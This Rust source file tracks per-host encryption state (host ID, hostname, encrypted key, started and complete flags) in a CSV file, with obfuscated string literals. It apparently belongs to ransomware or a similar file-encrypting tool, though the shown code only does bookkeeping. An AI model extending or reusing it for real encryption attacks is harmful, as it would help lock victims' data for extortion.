use csv::{ReaderBuilder, WriterBuilder};
use log::{debug, error, info};
use rand::{distr::Alphanumeric, rngs::StdRng, RngExt, SeedableRng};
use serde::{Deserialize, Serialize};
use std::{fs::File, path::Path, sync::LazyLock};

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct Status {
    pub id: String,
    pub hostname: String,
    pub asymmetrically_encrypted_symmetric_key: String,
    pub encryption_started: bool,
    pub encryption_complete: bool,
    pub symmetrically_encrypted_id: String,
    pub symmetrically_encrypted_id_nonce: String,
    pub symmetrically_encrypted_id_tag: String,
    pub encryption_aad: String,
}

pub static STATUS_FILENAME: LazyLock<String> = LazyLock::new(|| lc!("status.csv"));

pub fn import_status_csv(path: &Path) -> Option<Status> {
    let file = match File::open(path.join(&*STATUS_FILENAME)) {
        Ok(file) => {
            info!("Existing CSV file found: {file:?}");
            file
        }
        Err(error) => {
            info!("Existing CSV file not found: {error}");
            return None;
        }
    };
    let mut reader = ReaderBuilder::new().has_headers(true).from_reader(file);
    let row = if let Some(row) = reader.deserialize().next() {
        debug!("Parsing first row: {row:?}");
        row
    } else {
        error!("No first row to parse");
        return None;
    };
    let status = match row {
        Ok(parsed) => {
            debug!("Successfully parsed row to status: {parsed:?}");
            parsed
        }
        Err(error) => {
            error!("Failed to parse row to status: {error}");
            return None;
        }
    };
    Some(status)
}

pub fn export_status_csv(path: &Path, status: &Status) {
    let file = File::create(path.join(&*STATUS_FILENAME))
        .expect("Error accessing filesystem to write status CSV");
    let mut writer = WriterBuilder::new().has_headers(true).from_writer(file);
    writer
        .serialize(status)
        .expect("Failed to serialize status");
    writer.flush().expect("Failed to flush status to file");
}

pub fn create_status() -> Status {
    let status = Status {
        id: get_id(),
        hostname: get_hostname(),
        asymmetrically_encrypted_symmetric_key: String::new(),
        encryption_started: false,
        encryption_complete: false,
        symmetrically_encrypted_id: String::new(),
        symmetrically_encrypted_id_nonce: String::new(),
        symmetrically_encrypted_id_tag: String::new(),
        encryption_aad: String::from("Cartier and Tiffany"),
    };
    debug!("Created new status: {status:?}");
    status
}

fn get_hostname() -> String {
    match hostname::get() {
        Ok(name) => {
            debug!("Got hostname: {}", name.display());
            name.to_string_lossy().to_string()
        }
        Err(error) => {
            error!("Error getting hostname: {error}");
            String::from("HostnameError")
        }
    }
}

fn get_id() -> String {
    let rng = StdRng::from_rng(&mut rand::rng());
    let id = rng
        .sample_iter(&Alphanumeric)
        .take(16)
        .map(char::from)
        .collect();
    debug!("Created new ID: {id}");
    id
}
